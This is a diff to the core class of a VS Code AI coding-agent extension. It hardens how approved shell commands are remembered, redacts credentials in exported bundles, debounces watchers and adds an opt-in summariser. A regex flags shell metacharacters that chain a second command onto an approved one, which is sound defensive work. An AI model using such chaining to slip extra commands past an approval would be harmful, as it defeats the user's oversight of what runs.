@@ -12,11 +12,18 @@ import {
   interpolate,
 } from "../endpoints/profile";
 import type { ProviderConfig } from "../browser/search";
+import { readZip, guessTextType } from "./zip";
 import { clearAuthCache, authCacheReport } from "../endpoints/auth";
 import { clearSecureContexts } from "../endpoints/transport";
 import { EndpointClient } from "../providers/client";
 import { systemPromptFor, PHASES } from "../agent/loop";
 import { runOneShot, OneShotOptions } from "../agent/oneShot";
+import {
+  MicroCompactor,
+  AUX_WINDOW_FLOOR,
+  type MicroCompactConfig,
+  type Summariser,
+} from "../agent/compact";
 import { loadSkills, Skill, skillIndex } from "../skills/loader";
 import {
   loadAgents,
@@ -28,6 +35,7 @@ import {
 import { McpRegistry, mcpConfigPath } from "../mcp/registry";
 import { ShadowRepo } from "../checkpoint/shadow";
 import { ProposedContent } from "../ui/quickEdit";
+import { redactSecretsUnder, type SecretHit } from "./secretScan";
 import { DiagnosticsService, rungLabel } from "../diagnostics/service";
 import { SessionStore } from "./sessions";
 import { loadInstructions, ProjectInstructions, INSTRUCTIONS_CAP } from "./instructions";
@@ -78,6 +86,13 @@ import type {
   TodoDto,
   UiConfigDto,
 } from "../ui/protocol";
+import { PROTOCOL_VERSION } from "../ui/protocol";
+import {
+  emptyWorkspace,
+  loadWorkspace,
+  McpConfigStamp,
+  type LoadedWorkspace,
+} from "./workspaceConfig";
 
 type Sink = (msg: OutboundMessage) => void;
 
@@ -98,12 +113,25 @@ interface ChatExportSession {
  * persona and different tool lists are different agents - so it belongs in the
  * row rather than one level down.
  */
+/**
+ * One server's entry in the scope line.
+ *
+ * Three states, not two. A count means "these tools"; a bare server name means
+ * "all of them"; and `(none)` means an include list was written and left empty,
+ * which withholds every tool. Reading `include.length` alone drew that last
+ * case as unrestricted - the label agreeing with the bug rather than the user.
+ */
+function mcpScopeLabel(m: { server: string; include: string[]; includeActive: boolean }): string {
+  if (!m.includeActive) return m.server;
+  return m.include.length ? `${m.server} (${m.include.length})` : `${m.server} (none)`;
+}
+
 export function agentScopeLine(a: Agent): string {
   const tools = a.tools.length ? `${a.tools.length} built-in tool(s)` : "all built-in tools";
   const mcp = a.allMcp
     ? "all MCP servers"
     : a.mcp.length
-      ? `MCP: ${a.mcp.map((m) => (m.include.length ? `${m.server} (${m.include.length})` : m.server)).join(", ")}`
+      ? `MCP: ${a.mcp.map(mcpScopeLabel).join(", ")}`
       : "no MCP";
   const extras = [a.model ? a.model : "", a.memory ? "memory" : ""].filter(Boolean);
   return [tools, mcp, ...extras].join(" · ");
@@ -223,6 +251,40 @@ const UI_DEFAULTS: UiConfigDto = {
   inputWhileRunning: "queue",
 };
 const LOG_RING = 200;
+
+/**
+ * A NEW key, deliberately, so the old grants do not carry over.
+ *
+ * Entries under `genesis.alwaysAllowedCommands` were first tokens - `npm`,
+ * `git` - and each one authorised every command line starting with that word.
+ * Reading them under the new exact-match rule would be harmless (a bare token
+ * almost never equals a whole command line) but it would leave a list of
+ * meaningless rows in the Control Center that nobody could interpret. Starting
+ * clean costs each user re-approving the handful of commands they actually
+ * repeat, and it is the only way to be sure no over-broad grant survives.
+ */
+const ALLOWED_COMMANDS_KEY = "genesis.allowedCommandLines";
+
+/**
+ * Characters that make one command line into several.
+ *
+ * `run_command` executes through a shell, so these are the difference between
+ * "the command on the card" and "the command on the card, and then whatever
+ * else". A line containing any of them can be approved once, on a card that
+ * shows the whole line, but must never become a standing grant.
+ *
+ * Newlines count: a two-line string is two commands to a shell.
+ */
+const SHELL_META = /[;&|<>`\n\r]|\$\(/;
+
+function hasShellMetacharacter(command: string): boolean {
+  return SHELL_META.test(command);
+}
+
+/** One canonical spelling, so whitespace alone cannot defeat or duplicate a grant. */
+function normaliseCommand(command: string): string {
+  return String(command ?? "").trim().replace(/\s+/g, " ");
+}
 const REAL_CONFIG_KEYS = new Set([
   "profileDirectory",
   "skillsDirectory",
@@ -233,6 +295,7 @@ const REAL_CONFIG_KEYS = new Set([
   // launched rather than how the panel draws itself, and someone who wants a
   // visible browser wants it in every window.
   "browserHeaded",
+  "browserAutoDownload",
   "editorContext",
 ]);
 
@@ -243,6 +306,93 @@ const REAL_CONFIG_KEYS = new Set([
  * Everything that survives a reload - profiles, skills, phase, trace results,
  * the client pool, the running turn - lives here.
  */
+/** The value written in place of a literal credential in an exported bundle. */
+const BUNDLE_REDACTION = "REPLACED-SEE-README";
+
+/**
+ * Replace literal credentials in an exported bundle, in place.
+ *
+ * Only the copy is touched; the workspace is never written to. The test is
+ * deliberately shape-based rather than clever: a value under an auth-ish key
+ * that is NOT an interpolation (`${secret:…}`, `${env:…}`, `${file:…}`) is
+ * treated as the real thing. A false positive costs a placeholder in a config
+ * the recipient has to fill in anyway; a false negative is a live key in a
+ * folder someone was told was safe to email.
+ *
+ * Returns `<file>: <key>` for each replacement, for the manifest and the README.
+ */
+function redactBundleSecrets(dir: string): string[] {
+  const found: string[] = [];
+  const INTERPOLATED = /^\s*\$\{(secret|env|file):[^}]*\}\s*$/;
+  // YAML `value: xyz` / `keyPassphrase: xyz`, and JSON "Authorization": "xyz".
+  const SENSITIVE_KEY =
+    /^(value|token|secret|password|passphrase|key|api[_-]?key|apikey|client[_-]?secret|authorization|x-api-key|keypassphrase|pfxpassphrase)$/i;
+
+  const walk = (from: string) => {
+    let entries: import("node:fs").Dirent[];
+    try {
+      entries = fs.readdirSync(from, { withFileTypes: true });
+    } catch {
+      return;
+    }
+    for (const e of entries) {
+      const abs = path.join(from, e.name);
+      if (e.isDirectory()) {
+        walk(abs);
+        continue;
+      }
+      if (!/\.(ya?ml|json)$/i.test(e.name)) continue;
+      let text: string;
+      try {
+        text = fs.readFileSync(abs, "utf8");
+      } catch {
+        continue;
+      }
+      const rel = path.relative(dir, abs).split(path.sep).join("/");
+      // Line-based on purpose: it works identically for YAML and JSON, it
+      // cannot reorder or reformat a file someone hand-wrote, and a config
+      // that fails to parse still gets scanned.
+      const out = text.split("\n").map((line) => {
+        const m = line.match(/^(\s*"?)([A-Za-z0-9_.-]+)("?\s*[:=]\s*)(.*)$/);
+        if (!m) return line;
+        const [, lead, key, sep, rawValue] = m;
+        if (!SENSITIVE_KEY.test(key)) return line;
+        const value = rawValue.replace(/,\s*$/, "").trim();
+        const bare = value.replace(/^["']|["']$/g, "");
+        if (!bare || INTERPOLATED.test(bare)) return line;
+        // A structural value (a nested block, a list) holds no secret itself.
+        if (bare === "|" || bare === ">" || bare === "{" || bare === "[") return line;
+        found.push(`${rel}: ${key}`);
+        const quoted = /^["']/.test(value);
+        const trailing = rawValue.endsWith(",") ? "," : "";
+        return `${lead}${key}${sep}${quoted ? `"${BUNDLE_REDACTION}"` : BUNDLE_REDACTION}${trailing}`;
+      });
+      const next = out.join("\n");
+      if (next !== text) {
+        try {
+          fs.writeFileSync(abs, next, "utf8");
+        } catch {
+          /* the manifest still names it */
+        }
+      }
+    }
+  };
+  walk(dir);
+  return found;
+}
+
+/** Cheap change detector for a single config file. Absent reads as "". */
+function fileStamp(file: string): string {
+  try {
+    const st = fs.statSync(file);
+    return `${st.mtimeMs}:${st.size}`;
+  } catch {
+    return "";
+  }
+}
+
+const WATCH_DEBOUNCE_MS = 300;
+
 export class App {
   readonly output: vscode.OutputChannel;
   readonly sessions: SessionStore;
@@ -263,14 +413,39 @@ export class App {
    */
   readonly beforeContent = new ProposedContent("genesis-before");
 
-  profiles: EndpointProfile[] = [];
-  profileErrors: ProfileError[] = [];
-  skills: Skill[] = [];
-  skillWarnings: string[] = [];
-  agents: Agent[] = [];
-  agentWarnings: string[] = [];
+  /**
+   * Everything the workspace declares, as one value.
+   *
+   * These were six independent fields assigned in six places inside one long
+   * method, which is how `duplicateProfileNames` came to be set on one path
+   * and not on the other. One value, replaced wholesale, cannot be half
+   * updated - and the accessors below keep every existing reader working
+   * without knowing that changed.
+   */
+  workspace: LoadedWorkspace = emptyWorkspace();
+
+  get profiles(): EndpointProfile[] { return this.workspace.profiles; }
+  get profileErrors(): ProfileError[] { return this.workspace.profileErrors; }
+  get skills(): Skill[] { return this.workspace.skills; }
+  get skillWarnings(): string[] { return this.workspace.skillWarnings; }
+  get agents(): Agent[] { return this.workspace.agents; }
+  get agentWarnings(): string[] { return this.workspace.agentWarnings; }
+  /** Names that resolved to more than one file, so the picker can say so. */
+  get duplicateProfileNames(): string[] { return this.workspace.duplicateProfileNames; }
 
   phase: Phase = "act";
+
+  /**
+   * The memory block this session is sending, and whose it is.
+   *
+   * One entry, not a map: only the active agent's memory reaches a prompt, and
+   * keying on the name means an agent switch is caught even if the explicit
+   * invalidation below were ever missed.
+   */
+  private memorySnapshot?: { agent: string; memory: string | undefined };
+
+  /** Has the compaction feasibility line been logged in this window yet? */
+  private compactionReported = false;
   running = false;
   tracing = false;
   rungs: RungDto[] = [];
@@ -297,6 +472,13 @@ export class App {
   /** Last published render, so an unchanged screen does not re-broadcast. */
   private editorRendered = "";
   private warmTimer?: NodeJS.Timeout;
+  /** Cancels for the watchers' debounce timers, so dispose leaves none armed. */
+  private watchTimers: Array<() => void> = [];
+  /** Serialises reload(), and remembers whether another one is already queued. */
+  private reloading: Promise<void> = Promise.resolve();
+  private reloadQueued = false;
+  /** Decides whether .agent/mcp.json changed enough to restart the servers. */
+  private mcpStamp = new McpConfigStamp();
   private selectionTimer?: NodeJS.Timeout;
   private disposables: vscode.Disposable[] = [];
 
@@ -338,9 +520,15 @@ export class App {
    */
   private async migrateFromKryptonite(): Promise<void> {
     const ws = this.context.workspaceState;
+    /* `activeAgent` is deliberately NOT in this list any more.
+     *
+     * The agent belongs to a conversation now and travels in its transcript.
+     * Carrying the old workspace-wide key across would restore exactly the
+     * behaviour that was wrong - one agent applied to every chat - on the
+     * first run after upgrading, which is the worst moment for it. */
     for (const key of [
       "uiConfig", "disabledSkills", "alwaysAllowedCommands",
-      "activeSessionId", "activeAgent",
+      "activeSessionId",
     ]) {
       if (ws.get(`genesis.${key}`) !== undefined) continue;
       const old = ws.get(`kryptonite.${key}`);
@@ -358,7 +546,8 @@ export class App {
     if (typeof oldCfg.inspect !== "function") return;
     for (const key of [
       "profileDirectory", "skillsDirectory", "instructionsFile", "editorContext",
-      "readOutsideWorkspace", "browserHeaded", "activeProfile", "approvalMode",
+      "readOutsideWorkspace", "browserHeaded", "browserAutoDownload",
+      "activeProfile", "approvalMode",
       "caBundlePath", "codeLens", "codeActions", "inlineCompletion",
       "searchProvider", "searchApiKey", "searchEngineId", "browserProfile",
     ]) {
@@ -402,10 +591,12 @@ export class App {
       ...(this.context.workspaceState.get<Partial<UiConfigDto>>("genesis.uiConfig") ?? {}),
     };
     this.disabledSkills = this.context.workspaceState.get<string[]>("genesis.disabledSkills", []);
-    this.alwaysAllowedCommands = this.context.workspaceState.get<string[]>(
-      "genesis.alwaysAllowedCommands",
-      []
-    );
+    // Read under the new key only. See ALLOWED_COMMANDS_KEY for why the old
+    // first-token grants are deliberately not carried forward.
+    this.alwaysAllowedCommands = this.context.workspaceState
+      .get<string[]>(ALLOWED_COMMANDS_KEY, [])
+      .map(normaliseCommand)
+      .filter((c) => c && !hasShellMetacharacter(c));
     // Pick the conversation back up where the last window left it.
     this.session.restore();
 
@@ -603,6 +794,8 @@ export class App {
    * destroyed the connection pool and made the next turn pay a full handshake.
    */
   private installWatcher(): void {
+    for (const cancel of this.watchTimers) cancel();
+    this.watchTimers = [];
     this.watcher?.dispose();
     this.watcher = undefined;
     this.skillWatcher?.dispose();
@@ -616,11 +809,28 @@ export class App {
     const profileDir = this.cfg().get<string>("profileDirectory", ".agent/endpoints");
     const skillsDir = this.cfg().get<string>("skillsDirectory", ".agent/skills");
 
+    /* DEBOUNCED, WHICH IT WAS NOT.
+     *
+     * A VS Code file watcher fires once per file. A `git checkout`, an `npm
+     * install`, a formatter saving on a multi-file edit, or the agent itself
+     * writing several skills, all deliver a burst - and every one of those
+     * events used to call `reload()` in full. Each reload stops and respawns
+     * every MCP server, so a routine branch switch could mean dozens of
+     * process teardowns racing each other. */
     const bind = (glob: string, handler: () => void) => {
       const w = vscode.workspace.createFileSystemWatcher(new vscode.RelativePattern(root, glob));
-      w.onDidChange(handler);
-      w.onDidCreate(handler);
-      w.onDidDelete(handler);
+      let timer: NodeJS.Timeout | undefined;
+      const debounced = () => {
+        if (timer) clearTimeout(timer);
+        timer = setTimeout(() => {
+          timer = undefined;
+          handler();
+        }, WATCH_DEBOUNCE_MS);
+      };
+      this.watchTimers.push(() => timer && clearTimeout(timer));
+      w.onDidChange(debounced);
+      w.onDidCreate(debounced);
+      w.onDidDelete(debounced);
       return w;
     };
 
@@ -656,6 +866,8 @@ export class App {
 
   async dispose(): Promise<void> {
     this.session.dispose();
+    for (const cancel of this.watchTimers) cancel();
+    this.watchTimers = [];
     this.skillWatcher?.dispose();
     this.agentWatcher?.dispose();
     this.instructionsWatcher?.dispose();
@@ -714,7 +926,30 @@ export class App {
 
   /* ───────────────────────────── reload ───────────────────────────── */
 
+  /**
+   * Reload configuration, one at a time.
+   *
+   * `reload` had no reentrancy guard, and it is called from four watchers and
+   * from activation. Two overlapping calls each ran `mcp.reload`, which stops
+   * every server and then repopulates the registry by name - so the second
+   * call's `clients.set` overwrote the first call's freshly spawned client
+   * objects, and the processes they held were left running with nothing
+   * holding a reference to stop them. Serialising removes the race; collapsing
+   * a queued reload into one removes the pile-up behind it.
+   */
   async reload(reason: string, opts?: { keepClients?: boolean }): Promise<void> {
+    if (this.reloadQueued) return this.reloading;
+    this.reloadQueued = true;
+    const run = this.reloading.then(async () => {
+      this.reloadQueued = false;
+      await this.reloadNow(reason, opts);
+    });
+    // A failed reload must not wedge every reload after it.
+    this.reloading = run.catch(() => {});
+    return run;
+  }
+
+  private async reloadNow(reason: string, opts?: { keepClients?: boolean }): Promise<void> {
     if (!opts?.keepClients) {
       await this.closeClients();
       // Profiles can change CA bundles or client certificates, so the parsed
@@ -724,74 +959,38 @@ export class App {
 
     const root = this.root;
     if (!root) {
-      this.profiles = [];
-      this.profileErrors = [];
-      this.skills = [];
-      this.skillWarnings = [];
-      this.agents = [];
-      this.agentWarnings = [];
+      this.workspace = emptyWorkspace();
       this.updateStatus();
       return;
     }
 
-    const profileDir = path.join(root, this.cfg().get<string>("profileDirectory", ".agent/endpoints"));
-    const { profiles, errors } = loadAllProfiles(profileDir);
+    /* WHAT THE WORKSPACE DECLARES IS NOW READ IN ONE PLACE, AS A VALUE.
+     *
+     * This method was 170 lines doing two different jobs at once: deciding
+     * what the configuration IS, and telling everything else that it changed.
+     * The first is pure - a root and a few settings in, a value out - so it
+     * moved to workspaceConfig.ts, where the rules that actually bite can be
+     * tested without booting an extension host: a duplicate endpoint name, a
+     * workspace skill shadowing a bundled one, the global CA bundle merging
+     * into every profile. What stays here is the orchestration, which is
+     * where the side effects belong. */
+    this.workspace = loadWorkspace({
+      root,
+      profileDir: this.cfg().get<string>("profileDirectory", ".agent/endpoints"),
+      skillsDir: this.cfg().get<string>("skillsDirectory", ".agent/skills"),
+      agentsDir: this.agentsDir(),
+      bundledSkillsDir: path.join(this.context.extensionPath, "skills"),
+      globalCaBundle: this.cfg().get<string>("caBundlePath", ""),
+    });
+    // A profile that comes back must not still be remembered as missing.
+    this.warnedMissingProfile = "";
 
-    // A global CA bundle is a workspace-wide fact, so it merges into every
-    // profile rather than being repeated in each YAML.
-    const globalCa = this.cfg().get<string>("caBundlePath", "").trim();
-    if (globalCa) {
-      for (const p of profiles) {
-        const tls = p.tls ?? {};
-        const existing = tls.caBundle
-          ? Array.isArray(tls.caBundle)
-            ? [...tls.caBundle]
-            : [tls.caBundle]
-          : [];
-        if (!existing.includes(globalCa)) existing.push(globalCa);
-        p.tls = { ...tls, caBundle: existing };
-      }
+    for (const e of this.profileErrors) {
+      this.log("error", `Profile ${e.file ?? "(unknown)"}: ${e.message}`);
     }
-
-    this.profiles = profiles;
-    this.profileErrors = errors;
-    for (const e of errors) this.log("error", `Profile ${e.file ?? "(unknown)"}: ${e.message}`);
-
-    const workspaceSkills = loadSkills(
-      path.join(root, this.cfg().get<string>("skillsDirectory", ".agent/skills"))
-    );
-    const bundledDir = path.join(this.context.extensionPath, "skills");
-    const bundled = fs.existsSync(bundledDir)
-      ? loadSkills(bundledDir)
-      : { skills: [] as Skill[], warnings: [] as string[] };
-
-    // Workspace wins name collisions - a repo's own version of a skill is the
-    // one its authors intended. That is deliberate, but it was also SILENT:
-    // a workspace skill could shadow a bundled one of the same name and the
-    // only visible effect was that the bundled skill's body stopped being the
-    // one that loaded. Intentional behaviour still has to be legible, so the
-    // shadowing is reported. Duplicates WITHIN either directory are refused
-    // outright by loadSkills - see the note there.
-    const merged = new Map<string, Skill>();
-    for (const s of bundled.skills) merged.set(s.name, s);
-    const shadowed: string[] = [];
-    for (const s of workspaceSkills.skills) {
-      if (merged.has(s.name)) shadowed.push(s.name);
-      merged.set(s.name, s);
-    }
-    this.skills = [...merged.values()];
-    this.skillWarnings = [...workspaceSkills.warnings, ...bundled.warnings];
-    if (shadowed.length) {
-      this.skillWarnings.push(
-        `Your workspace overrides ${shadowed.length === 1 ? "a bundled skill" : "bundled skills"}: ` +
-          `${shadowed.join(", ")}. The workspace copy is the one that loads.`
-      );
-    }
-
-    const loaded = loadAgents(this.agentsDir());
-    this.agents = loaded.agents;
-    this.agentWarnings = loaded.warnings;
+    for (const w of this.skillWarnings) this.log("warn", `Skill: ${w}`);
     for (const w of this.agentWarnings) this.log("warn", `Agent: ${w}`);
+
     // An agent that was selected and has since been renamed or deleted must
     // not stay silently active: the persona would be gone while the panel
     // still named it.
@@ -800,13 +999,24 @@ export class App {
       void this.setActiveAgent("");
     }
 
-    // MCP servers are child processes, so a reload stops the old ones first.
-    // Not awaited into the critical path: a cold `npx` fetch can take seconds
-    // and the panel must not sit blank behind it.
-    void this.mcp.reload(mcpConfigPath(root), root).then(() => {
-      this.broadcast({ type: "mcpChanged", servers: this.mcp.statuses(), warnings: this.mcp.warnings });
-    });
-    for (const w of this.skillWarnings) this.log("warn", `Skill: ${w}`);
+    /* MCP SERVERS ARE ONLY RESTARTED WHEN THEIR CONFIG ACTUALLY CHANGED.
+     *
+     * This ran unconditionally, which means `reloadSkillsOnly` ran it too -
+     * the "cheap" reload whose entire purpose is not to tear things down
+     * mid-conversation, and whose comment says agents and skills "share the
+     * cheap reload rather than tearing the connection pool down". True of the
+     * HTTP clients; false of every MCP child process, which is a heavier thing
+     * to lose. Saving a SKILL.md while a turn was running killed the servers
+     * under it, and an in-flight call came back "MCP server is stopped".
+     *
+     * Still not awaited into the critical path: a cold `npx` fetch takes
+     * seconds and the panel must not sit blank behind it. */
+    const mcpFile = mcpConfigPath(root);
+    if (this.mcpStamp.changed(mcpFile)) {
+      void this.mcp.reload(mcpFile, root).then(() => {
+        this.broadcast({ type: "mcpChanged", servers: this.mcp.statuses(), warnings: this.mcp.warnings });
+      });
+    }
 
     await this.primeSecrets();
 
@@ -859,10 +1069,70 @@ export class App {
 
   /* ───────────────────────────── accessors ───────────────────────────── */
 
+  /**
+   * The profile the next turn will use, or nothing.
+   *
+   * THE FALLBACK ONLY APPLIES WHEN NOTHING IS SELECTED.
+   *
+   * `?? this.profiles[0]` used to be unconditional, so a configured name that
+   * stopped resolving - a YAML typo, a rename, a moved file - silently moved
+   * the conversation to whatever `readdirSync` returned first. Someone with an
+   * internal gateway and a hosted profile who broke the internal one's YAML
+   * had their next message, and everything in it, sent to the other endpoint.
+   * Nothing on screen said the selection had changed.
+   *
+   * Picking the first profile when NONE is selected is different and still
+   * right: that is a fresh install with one profile in the folder, and asking
+   * someone to choose from a list of one is a step for nothing.
+   */
   activeProfile(): EndpointProfile | undefined {
-    const name = this.cfg().get<string>("activeProfile", "");
-    return this.profiles.find((p) => p.name === name) ?? this.profiles[0];
+    const name = this.cfg().get<string>("activeProfile", "").trim();
+    if (!name) return this.profiles[0];
+    return this.profiles.find((p) => p.name === name);
   }
+
+  /**
+   * Why `activeProfile()` came back empty, in a sentence for the user.
+   *
+   * Two different failures reach the same empty result and need different
+   * answers: nothing configured at all, versus a selection that no longer
+   * names anything.
+   */
+  activeProfileProblem(): { message: string; fix: string } | undefined {
+    if (this.activeProfile()) return undefined;
+    const name = this.cfg().get<string>("activeProfile", "").trim();
+    if (!name) {
+      return {
+        message: "No endpoint profile is set up yet.",
+        fix:
+          `Genesis reads them from \`${this.cfg().get<string>("profileDirectory", ".agent/endpoints")}\` ` +
+          `in the folder you have open. Create one from the Control Center, or open a folder that ` +
+          `already has one.`,
+      };
+    }
+    const dir = this.cfg().get<string>("profileDirectory", ".agent/endpoints");
+    /* A profile's NAME is inside its file, so a file that failed to parse
+     * cannot be matched to the name that is missing - the parse is exactly
+     * what would have told us. So when anything failed to load, that is
+     * reported as the likely cause rather than guessed at from filenames. */
+    const broken = this.profileErrors;
+    const available = this.profiles.map((p) => p.name);
+    return {
+      message: `The selected profile "${name}" is not available.`,
+      fix: broken.length
+        ? `${broken.length} file(s) in ${dir} did not load, and one of them is probably it: ` +
+          broken.map((e) => `${e.file ? path.basename(e.file) : "?"} (${e.message})`).join("; ") +
+          `. Fix that, or pick another profile` +
+          (available.length ? ` - ${available.join(", ")} did load` : "") +
+          `. Genesis will not quietly send this conversation somewhere else.`
+        : available.length
+          ? `No profile in ${dir} is called that any more. Pick one of: ${available.join(", ")}.`
+          : `No profiles loaded at all. Check ${dir}.`,
+    };
+  }
+
+  /** So the substitution above is reported once, not on every accessor call. */
+  private warnedMissingProfile = "";
 
   /** What to do with a message typed while a turn is running. */
   inputWhileRunning(): "queue" | "steer" {
@@ -937,8 +1207,108 @@ export class App {
     await Promise.allSettled([
       client.warmConnection(),
       client.warmAuth(),
-      client.warmCache(this.systemPrompt()),
+      // The same identity the real request will carry. Without it the warmed
+      // prefix diverges from the second line onwards and the entry is never hit.
+      client.warmCache(
+        this.systemPrompt(this.phase, { model: profile.model, endpoint: profile.name })
+      ),
     ]);
+  }
+
+  /* ─────────────────────── micro-compaction ─────────────────────── */
+
+  /** The knobs, read fresh so a settings change lands on the next conversation. */
+  microCompactConfig(): Partial<MicroCompactConfig> {
+    return {
+      micro_compact: this.cfg().get<boolean>("microCompact", false) === true,
+      micro_compact_every_n_turns: Math.max(
+        1,
+        Number(this.cfg().get<number>("microCompactEveryNTurns", 1)) || 1
+      ),
+      micro_compact_defrag_threshold_tokens:
+        Number(this.cfg().get<number>("microCompactDefragThresholdTokens", 2000)) || 2000,
+    };
+  }
+
+  /**
+   * A second, cheaper model to condense with.
+   *
+   * `kind:` is what picks it, which is the reason that field exists: a profile
+   * that says `chat` is a plain instruct model, and condensing an exchange is
+   * the least demanding thing a model can be asked to do. Sending it to a
+   * reasoning profile would spend a thinking budget on paraphrase, and sending
+   * it to the profile already running the turn would double what that endpoint
+   * is billed for, which is the opposite of the point.
+   *
+   * The active profile is excluded for that reason, so this returns something
+   * only when the workspace really has a second endpoint to spare. Absent is
+   * the normal case and is not a failure - `feasible()` says so once and the
+   * loop keeps trimming as it always did.
+   */
+  auxSummariser(): Summariser | undefined {
+    // Named by the user, never chosen for them. This used to pick the first
+    // profile that was `kind: chat`, was not the active one and cleared the
+    // window floor - which meant switching micro-compaction on quietly sent
+    // conversation content, including file contents and command output the
+    // agent had read, to an endpoint the user configured for something else
+    // entirely. With one user and a line in the log that is survivable. With a
+    // hundred it is a privacy incident waiting for the first person who has a
+    // cloud profile sitting beside a local one.
+    //
+    // So there is no fallback. An unset, unknown or undersized profile means no
+    // summariser, `feasible()` says which and why, and the loop trims with
+    // `fitToWindow` exactly as it did before. The feature not running is a much
+    // smaller cost than the feature running somewhere unexpected.
+    const named = this.cfg().get<string>("microCompactProfile", "").trim();
+    if (!named) return undefined;
+    const aux = this.profiles.find((p) => p.name === named);
+    if (!aux || aux.capabilities.contextWindow < AUX_WINDOW_FLOOR) return undefined;
+    return {
+      name: aux.name,
+      contextWindow: aux.capabilities.contextWindow,
+      summarise: async (transcript, targetChars, signal) =>
+        runOneShot(this.clientFor(aux), transcript, {
+          system:
+            "Condense the transcript below into a compact note, written in the first person as " +
+            "the assistant recalling its own earlier work. Keep file paths, identifiers, " +
+            "commands, decisions and anything discovered; drop narration and repetition. No " +
+            "preamble and no closing remark.",
+          maxTokens: Math.max(128, Math.ceil(targetChars / 3.6)),
+          temperature: 0,
+          signal,
+        }),
+    };
+  }
+
+  /**
+   * A compactor for one conversation, and a line in the log the first time.
+   *
+   * Said once per window rather than per session, because the answer depends on
+   * the profiles and the settings and not on which chat is open - and a line on
+   * every new chat would be noise. Reported at `info` in both directions: "off"
+   * and "on" are both things someone debugging a shrinking context needs to
+   * know, and neither is a warning.
+   */
+  newCompactor(): MicroCompactor {
+    const c = new MicroCompactor(this.microCompactConfig(), this.auxSummariser());
+    if (!this.compactionReported) {
+      this.compactionReported = true;
+      const f = c.feasible();
+      // Both directions are worth a line, and the "on" one says what leaves the
+      // machine. Someone switching this on is agreeing to send parts of their
+      // conversation - file contents and command output included - to a second
+      // endpoint, and that should be stated once where they can see it rather
+      // than inferred from a setting called "micro compact".
+      const hint =
+        !f.ok && this.cfg().get<boolean>("microCompact", false) === true && !this.auxSummariser()
+          ? " Name one with genesis.microCompactProfile."
+          : "";
+      const sends = f.ok
+        ? " Parts of this conversation, including file contents the agent read, will be sent there to be condensed."
+        : "";
+      this.log("info", `Micro-compaction: ${f.ok ? "on" : "not running"} - ${f.why}.${hint}${sends}`);
+    }
+    return c;
   }
 
   /**
@@ -966,14 +1336,52 @@ export class App {
    * Shared with the agent loop so the pre-warmed cache entry and the real
    * request are byte-identical - a prefix that differs by one character caches
    * nothing.
+   *
+   * "Byte-identical" is a claim about five arguments, and it held for four of
+   * them. `identity` was simply not passed here, and since it is the second
+   * element of the joined array every character after SYSTEM differed - so
+   * every pre-warm on a profile with a model name was warming a prefix no
+   * request would ever send. The audit, so the next reader does not have to
+   * repeat it:
+   *
+   *   skills        `enabledSkills(agent)` here, and `ctx.skills` there, which
+   *                 session.ts fills from this same method.
+   *   instructions  `this.instructions?.block` here; session.ts reads the same
+   *                 field off this same App.
+   *   agent/memory  `agentMemorySnapshot(agent)` in both, which is the point of
+   *                 the snapshot: `agentMemory` returned whatever was on disk
+   *                 at the moment of the call, so the two sites agreed only
+   *                 until the agent wrote to its own memory file.
+   *   identity      passed by both now. The caller supplies it because App
+   *                 must not assume the profile the turn will actually use.
+   *   phase         defaults to `this.phase` here; session.ts reads `app.phase`
+   *                 and runAgent applies `?? "act"` to a value that is never
+   *                 undefined. Same string.
    */
-  systemPrompt(phase: Phase = this.phase): string {
+  systemPrompt(
+    phase: Phase = this.phase,
+    identity?: { model: string; endpoint: string }
+  ): string {
     const agent = this.activeAgent();
+    const profile = this.activeProfile();
     return systemPromptFor(
       this.enabledSkills(agent),
       phase,
-      agent ? { agent, memory: this.agentMemory(agent) } : undefined,
-      this.instructions?.block
+      agent ? { agent, memory: this.agentMemorySnapshot(agent) } : undefined,
+      this.instructions?.block,
+      /* DEFAULTED FROM THE ACTIVE PROFILE, not left to the caller.
+       *
+       * `identityLine` sits SECOND in the joined prompt, ahead of the skills
+       * index, the instructions and the persona - so a caller that omits it
+       * does not produce a slightly shorter head, it produces one that shares
+       * no cache prefix with the real request at all. Caching is a prefix
+       * match: every pre-warm written without it was a billed round trip that
+       * bought nothing, and every real request still paid a full cache write.
+       *
+       * The parameter stays, because a caller asking about a DIFFERENT profile
+       * is a real thing to want. It just is not the thing that happens when
+       * someone forgets. */
+      identity ?? (profile ? { model: profile.model, endpoint: profile.name } : undefined)
     );
   }
 
@@ -1052,6 +1460,27 @@ export class App {
   }
 
   /**
+   * Where a fetched browser lives. One directory per version.
+   *
+   * globalStorage, not the workspace: it is 150-300 MB of binary that belongs
+   * to the machine, not to any one repository, and fetching it again for every
+   * checkout would be absurd.
+   */
+  browserCacheDir(): string {
+    return path.join(this.context.globalStorageUri.fsPath, "browsers");
+  }
+
+  /**
+   * The client the active profile talks through, for anything that should
+   * take the same road the model's own traffic takes - the corporate CA, the
+   * CONNECT proxy, the client certificate.
+   */
+  activeClient(): EndpointClient | undefined {
+    const p = this.activeProfile();
+    return p ? this.clientFor(p) : undefined;
+  }
+
+  /**
    * Put the browser panel on screen, beside the editor.
    *
    * Called when the agent starts a browser, because "launch the browser" that
@@ -1126,9 +1555,106 @@ export class App {
     if (uris.length) await this.attachUris(uris);
   }
 
-  /** Read, size-check and base64 a set of URIs, then hand them to the panel. */
+  /**
+   * Turn an archive into the files inside it.
+   *
+   * A zip handed over as base64 is an opaque blob: `composeUserMessage`
+   * decodes text attachments and inlines them, and a zip decodes to nothing a
+   * model can read, so attaching one was a no-op wearing a chip. Expanding it
+   * here means the panel treats `report.zip` as the twelve source files it
+   * holds, each named `report.zip/src/thing.ts`, which is what someone
+   * dragging an archive in meant.
+   *
+   * WHAT IS LEFT OUT, AND WHY EACH
+   *
+   * - Directory records: no bytes.
+   * - The junk every archive of a project carries - `node_modules`, `.git`,
+   *   build output, macOS resource forks. These are the bulk of the entries
+   *   and none of them is what the archive was attached for. A model asked to
+   *   read a project does not want its lockfile tree.
+   * - Files that are not text and not images. The pipeline can use those two;
+   *   everything else would arrive as a note saying it could not be read.
+   *
+   * WHAT IS BOUNDED, AND WHY
+   *
+   * The owner asked for no size limit and there is none on the archive. There
+   * are bounds on what comes OUT of one, which is a different thing: an
+   * archive is attacker-supplied structure, and a 42-kilobyte zip that
+   * expands to several petabytes is a known shape. `MAX_TOTAL` stops reading
+   * rather than refusing the file, so a bomb yields what fitted plus a note,
+   * and an ordinary archive never reaches it.
+   */
+  private expandArchive(
+    buf: Buffer,
+    archiveName: string,
+    MIME: Record<string, string>
+  ): Array<{ name: string; mediaType: string; data: string; size: number }> {
